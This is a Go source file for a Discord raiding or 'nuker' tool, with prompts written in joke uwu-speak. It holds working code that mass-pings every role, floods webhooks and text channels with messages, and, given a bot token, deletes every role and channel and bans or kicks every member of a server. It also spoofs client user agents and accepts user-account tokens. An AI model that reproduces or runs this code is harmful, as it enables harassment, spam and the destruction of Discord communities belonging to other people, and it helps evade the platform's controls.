package main

import (
	"bytes"
	"fmt"
	"net/http"
	"net/url"
	"os"
	"os/signal"
	"strconv"
	"strings"
	"syscall"

	"github.com/bwmarrin/discordgo"
	"github.com/fatih/color"
)

const (
	BOT_CLOAK  = "DiscordBot (https://github.com/Rapptz/discord.py 0.2) Python/3.9 aiohttp/2.3"
	USER_CLOAK = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
)

var (
	discord *discordgo.Session
	token   string
	isBot   bool
)

func getChannelsOrGuild(mainGuildId *string, channels *[]*discordgo.Channel, restart *bool) error {
	msg := "uwu must pwovide channew id(s) / a sewvew id."
	channelStrings := strings.Split(getInput("channew id(s) (sepewate with ',') ow sewvew id:", true, &msg), ",")
	err := loading("confiwming channew(s) ow guiwd...", func(finished *bool, err *error) {
		if len(channelStrings) == 1 {
			if guild, e := discord.Guild(channelStrings[0]); e != nil {
				if channel, e := discord.Channel(channelStrings[0]); e != nil {
					*err = e
					*finished = true
					return
				} else {
					*channels = make([]*discordgo.Channel, 1)
					*mainGuildId = channel.GuildID
					(*channels)[0] = channel
				}
			} else {
				ch, _ := discord.GuildChannels(guild.ID)
				*channels = ch
				*mainGuildId = guild.ID
			}
		} else {
			*channels = make([]*discordgo.Channel, len(channelStrings))
			for _, cs := range channelStrings {
				channel, e := discord.Channel(cs)
				if e != nil {
					*err = e
					*finished = true
					return
				} else {
					if *mainGuildId == "" {
						*mainGuildId = channel.GuildID
					} else {
						if *mainGuildId != channel.GuildID {
							*restart = true
							*err = discordgo.ErrNilState // random idk it works
							*finished = true
							return
						}
					}
					*channels = append(*channels, channel)
				}
			}
		}
		*finished = true
	})
	if *restart {
		errorPr("\naww channews must be in the same sewvew; westawting.")
	}
	return err
}

func massSend(content string, channels []*discordgo.Channel, count int, pretty func(tracker, count int)) error {
	fmt.Print("\n")
	tracker := 1
	for i := 0; i < count; i++ {
		for c, channel := range channels {
			if channel.Type != discordgo.ChannelTypeGuildText && channel.Type != discordgo.ChannelTypeGuildNews {
				continue
			}
			_, err := discord.ChannelMessageSend(channel.ID, content)
			if err != nil {
				return err
			} else {
				if tracker > 1 {
					clearLine(1)
				}
				pretty(tracker, c)
			}
			tracker++
		}
	}

	if tracker == 0 {
		errorPr("sent no messages - missing pewms ow channew(s) awe voice?")
	}

	return nil
}

func getContent(content *string, restart *bool) {
	msg := "uwu must pwovide a content vawue."
	ct := getInput("message content:", true, &msg)
	if len(ct) > 2000 {
		errorPr("content wength cannot be above 2000; westawting.")
		*restart = true
	} else {
		*content = ct
	}
}

func massPing() error {
	var mainGuildId string // main guild -> all channels are in!!!
	var channels []*discordgo.Channel
	var restart bool
	err := getChannelsOrGuild(&mainGuildId, &channels, &restart)
	if err != nil {
		return err
	}
	if restart {
		return massPing()
	}
	msg := "uwu must pwovide a count."
	countString := getInput("how many messages shouwd be spammed (in each channew)?", true, &msg)
	count, err := strconv.Atoi(countString)
	if err != nil {
		errorPr(fmt.Sprintf("'%s' iws nowt an integew; westawting.", countString))
		return massPing()
	} else if count <= 0 {
		errorPr("count cannot be/be bewow 0; westawting.")
		return massPing()
	}
	pingString := ""
	err = loading("genewating mass ping...", func(finished *bool, err *error) {
		guildRoles, e := discord.GuildRoles(mainGuildId)
		*err = e
		for _, gR := range guildRoles {
			if gR.Name == "@everyone" {
				continue
			}
			pingString += gR.Mention()
		}
		*finished = true
	})
	if err != nil {
		return err
	}

	return massSend(pingString, channels, count, func(tracker, count int) {
		if tracker%2 == 0 {
			SuccessColour.Printf("OwO sent %d messages...\n", tracker)
		} else {
			SuccessColour.Printf("UwU sent %d messages...\n", tracker)
		}
	})
}

func webhookSpam() error {
	webhookString := getInput("entew a webhook uww:", true, nil)
	webhookUrl, err := url.Parse(webhookString)
	if err != nil {
		errorPr("invawid uww; westawting.")
		return webhookSpam()
	}
	restart := false
	err = loading("confiwming webhook vawidity...", func(finished *bool, err *error) {
		_, e := http.Get(webhookUrl.String())
		if e != nil {
			restart = true
			*err = discordgo.ErrNilState
		}
		*finished = true
	})
	if restart {
		errorPr("\nfaiwed tuwu fetch data fwom webhook; westawting.")
		return webhookSpam()
	}
	if err != nil {
		return err
	}

	var content string
	getContent(&content, &restart)
	if restart {
		return webhookSpam()
	}

	username := getInput("usewname fow the webhook usew:", false, nil)
	iconUrl := getInput("icon (uww) fow the webhook usew:", false, nil)

	faces := []string{
		"🎆",
		"🎉",
		"✨",
	}
	face := 0

	cnt := 0
	fmt.Print("\n")
	for {
		var jsonStr = []byte(fmt.Sprintf(`{"content": "%s", "username": "%s", "avatar_url": "%s"}`, content, username, iconUrl))
		req, err := http.NewRequest("POST", webhookUrl.String(), bytes.NewBuffer(jsonStr))
		if err != nil {
			return err
		}
		req.Header.Set("Content-Type", "application/json")
		_, err = http.DefaultClient.Do(req)
		if err != nil {
			return err
		}
		face++
		if face == len(faces) {
			face = 0
		}
		if cnt > 0 {
			clearLine(1)
		}
		SuccessColour.Printf("%s spamming... (ctww+c tuwu stowp)\n", faces[face])
		face++
		if face == len(faces) {
			face = 0
		}
		cnt++
	}
}

func textChannelSpam() error {
	var mainGuildId string
	var channels []*discordgo.Channel
	var restart bool
	err := getChannelsOrGuild(&mainGuildId, &channels, &restart)
	if err != nil {
		return err
	}
	if restart {
		return textChannelSpam()
	}

	var content string
	getContent(&content, &restart)
	if restart {
		return textChannelSpam()
	}

	faces := []string{
		">:| >",
		">:( >",
		">:S >",
		">:P >",
		">:3 >",
	}
	face := 0

	return massSend(content, channels, 10000, func(tracker, count int) {
		SuccessColour.Printf("%s spamming... (ctww+c tuwu stowp)\n", faces[face])
		face++
		if face == len(faces) {
			face = 0
		}
	})
}

func serverDestroy() error {
	if !isBot {
		errorPr("how did we get hewe?")
	}

	msg := "uwu must pwovide a sewvew id."
	guild, err := discord.Guild(getInput("sewvew id:", true, &msg))
	if err != nil {
		//print(err.Error())
		errorPr("invawid sewvew id; westawting.")
		return serverDestroy()
	}

	var roles []*discordgo.Role
	var channels []*discordgo.Channel
	var members []*discordgo.Member
	err = loading("fetching sewvew data...", func(finished *bool, err *error) {
		roles, _ = discord.GuildRoles(guild.ID)
		channels, _ = discord.GuildChannels(guild.ID)
		ms, e := discord.GuildMembers(guild.ID, "", 1000)
		members = ms
		if e != nil {
			*err = e
		}
		*finished = true
	})
	if err != nil {
		return err
	}

	missingPerms := `HTTP 403 Forbidden, {"message": "Missing Permissions", "code": 50013}`

	// all roles
	missingRolePerms := false
	err = progressBar("deweting aww wowes...", func(length, done *int, err *error) {
		*length = len(roles)
		*done = 0
		for r, role := range roles {
			if role.Name != "@everyone" && !role.Managed {
				e := discord.GuildRoleDelete(guild.ID, role.ID)
				if e != nil {
					// cheap and easy
					if e.Error() == missingPerms {
						missingRolePerms = true
					} else {
						*err = e
						return
					}
				}
			}
			*done = r + 1
		}
	})
	if err != nil {
		return err
	}

	// all channels
	missingChannelPerms := false
	err = progressBar("deweting aww channews...", func(length, done *int, err *error) {
		*length = len(channels)
		*done = 0
		for c, channel := range channels {
			_, e := discord.ChannelDelete(channel.ID)
			if e != nil {
				print(e.Error())
				if e.Error() == missingPerms {
					missingChannelPerms = true
				} else {
					*err = e
					return
				}
			}
			*done = c + 1
		}
	})
	if err != nil {
		return err
	}

	// all members
	missingKickPerms := false
	err = progressBar("banning/kicking aww membews...", func(length, done *int, err *error) {
		*length = len(members)
		*done = 0
		for m, member := range members {
			e := discord.GuildBanCreate(guild.ID, member.User.ID, 0)
			if e != nil {
				// attempt to kick if can't ban
				e = discord.GuildMemberDelete(guild.ID, member.User.ID)
				if e.Error() == missingPerms {
					missingKickPerms = true
				} else {
					*err = e
					return
				}
			}
			*done = m + 1
		}
	})
	if err != nil {
		return err
	}

	if missingRolePerms {
		errorPr("\nnowt aww wowes wewe wemoved due tuwu missing pewms.")
	}
	if missingChannelPerms {
		errorPr("\nnowt aww channews wewe wemoved due tuwu missing pewms.")
	}
	if missingKickPerms {
		errorPr("\nnowt aww membews wewe kicked/banned due tuwu missing pewms.")
	}

	return nil
}

func pick() {
	// all sections
	options := []string{
		"mass pingew", "webhook spammew", "text channew spammew", "sewvew destwoyew",
	}
	if !isBot {
		options[len(options)-1] = ""
	}
	section := fromSelection("which toow duwu uwu wish tuwu use, mastew? Q///Q", options)
	var err error
	switch section {
	case 0:
		err = massPing()
	case 1:
		err = webhookSpam()
	case 2:
		err = textChannelSpam()
	case 3:
		err = serverDestroy()
	}
	if err != nil {
		fatal("\nIM SOWWY!!! An ewwow occuwed... Q//Q :'" + err.Error() + "'.\n")
	} else {
		message("\nDONE! :3.")
		pick() // loop
	}
}

func main() {
	// ctrl+c
	c := make(chan os.Signal)
	signal.Notify(c, os.Interrupt, syscall.SIGTERM)
	go func() {
		<-c
		message("\n\cwosing down...\n")
		os.Exit(0)
	}()
	fmt.Println(color.GreenString(title())) // print title
	// get token
	token = getInput("entew youw discowd token pweease:", true, nil)
	isBot = yesOrNo("cawn uwu has teh bot??")
	if isBot {
		token = "Bot " + token
	}
	if cord, err := discordgo.New(token); err != nil {
		fatal("faiwed tuwu initiawise discowd cwient, sowwy!!")
		return
	} else {
		discord = cord
		if isBot {
			discord.UserAgent = BOT_CLOAK
		} else {
			discord.UserAgent = USER_CLOAK
		}
		// loading slash
		err := loading("connecting tuwu discowd...", func(finished *bool, err *error) {
			_, e := discord.User("@me")
			*err = e
			*finished = true
		})
		if err != nil {
			fatal("\ninvawid token ow faiwed connection Q///Q\n")
			return
		} else {
			success("\nsuccessfuwwy connected!")
		}
	}
	// open looping picker
	pick()
}
